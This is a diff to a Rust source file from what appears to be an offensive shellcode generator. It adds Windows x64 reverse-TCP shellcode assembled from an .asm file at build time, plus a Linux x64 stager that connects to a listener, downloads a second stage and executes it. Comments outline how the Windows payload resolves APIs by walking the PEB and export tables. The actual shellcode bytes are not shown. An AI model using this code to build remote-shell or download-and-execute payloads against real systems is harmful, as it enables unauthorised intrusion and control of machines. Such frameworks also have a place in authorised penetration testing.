@@ -7,6 +7,12 @@
 //! Placeholders:
 //! - `0x7f, 0x7f, 0x7f, 0x7f` — IPv4 address (4 bytes)
 //! - `0x7e, 0x7e` — Port number (2 bytes, network byte order)
+//!
+//! Windows shellcode is assembled from `windows_shellcode.asm` at build time.
+//! Install `nasm` and rebuild to generate real shellcode.
+
+/// Auto-generated shellcode from build.rs (assembled from .asm files)
+include!(concat!(env!("OUT_DIR"), "/shellcode.rs"));
 
 /// A compiled shellcode template.
 #[derive(Debug, Clone)]
@@ -79,6 +85,9 @@ pub fn get_template(
         }
         (crate::PayloadType::CmdExec, crate::Platform::Windows, crate::Arch::X64) => {
             Ok(cmd_exec_windows_x64())
+        }
+        (crate::PayloadType::Stager, crate::Platform::Linux, crate::Arch::X64) => {
+            Ok(stager_linux_x64())
         }
         _ => Err(anyhow::anyhow!(
             "No template for {}/{}/{} — use reverse_tcp/linux/x64, reverse_tcp/linux/x86, reverse_tcp/macos/x64, bind_tcp/linux/x64, bind_tcp/linux/x86, or cmd_exec/linux/x64",
@@ -578,34 +587,47 @@ fn cmd_exec_linux_x64() -> ShellcodeTemplate {
 
 // ─── Windows Payload Templates ─────────────────────────────────────────
 //
-// Windows shellcode is significantly more complex than Linux because it
-// requires dynamic API resolution (no stable syscall numbers).
-// The recommended approach is to use the PE builder which creates a full
-// PE executable with proper imports.
+// Windows shellcode requires dynamic API resolution because:
+// 1. No stable syscall numbers (unlike Linux's syscalls)
+// 2. DLL base addresses are randomized by ASLR
+// 3. Must walk PEB → LDR → module list to find kernel32.dll
+// 4. Must parse export tables to find LoadLibraryA/GetProcAddress
+// 5. Must load ws2_32.dll and resolve WSAStartup/WSASocket/connect
 //
-// These shellcode templates are stubs — use the PE builder for real payloads:
-//   rcf venom -p reverse_tcp --lhost X.X.X.X --lport 4444 -f pe
+// These templates are assembled from src/windows_shellcode.asm at build time.
+// Install nasm for real shellcode, otherwise placeholder bytes are used.
 
 fn reverse_tcp_windows_x64() -> ShellcodeTemplate {
+    // Assembled from windows_shellcode.asm via build.rs
+    // If nasm is installed: ~650 bytes of real shellcode
+    // If nasm is not installed: 4-byte placeholder (xor rax,rax; ret)
     ShellcodeTemplate::new(
         "windows/x64/shell/reverse_tcp",
         "windows",
         "x64",
-        vec![
-            // Placeholder — use PE builder for full Windows payload
-            0x48, 0x31, 0xc0,             // xor rax, rax
-            0xc3,                         // ret
-        ],
+        WINDOWS_REVERSE_TCP_X64.to_vec(),
+    )
+}
+
+fn stager_linux_x64() -> ShellcodeTemplate {
+    // Assembled from stager_linux_x64.asm via build.rs
+    // ~110 bytes — connects to listener, downloads stage, executes it
+    ShellcodeTemplate::new(
+        "linux/x64/stager/reverse_tcp",
+        "linux",
+        "x64",
+        STAGER_LINUX_X64.to_vec(),
     )
 }
 
 fn reverse_tcp_windows_x86() -> ShellcodeTemplate {
+    // x86 placeholder — requires separate assembly file
+    // Same structure as x64 but uses fs:[0x30] for PEB and int 0x80/sysenter
     ShellcodeTemplate::new(
         "windows/x86/shell/reverse_tcp",
         "windows",
         "x86",
         vec![
-            // Placeholder — use PE builder for full Windows payload
             0x31, 0xc0,                   // xor eax, eax
             0xc3,                         // ret
         ],
@@ -613,6 +635,8 @@ fn reverse_tcp_windows_x86() -> ShellcodeTemplate {
 }
 
 fn bind_tcp_windows_x64() -> ShellcodeTemplate {
+    // Bind TCP requires bind()/listen()/accept() instead of connect()
+    // Similar structure to reverse_tcp but with server socket setup
     ShellcodeTemplate::new(
         "windows/x64/shell/bind_tcp",
         "windows",
@@ -637,6 +661,8 @@ fn bind_tcp_windows_x86() -> ShellcodeTemplate {
 }
 
 fn cmd_exec_windows_x64() -> ShellcodeTemplate {
+    // Windows command execution — requires CreateProcessA
+    // Uses same PEB walking + API resolution as reverse_tcp
     ShellcodeTemplate::new(
         "windows/x64/exec/cmd",
         "windows",
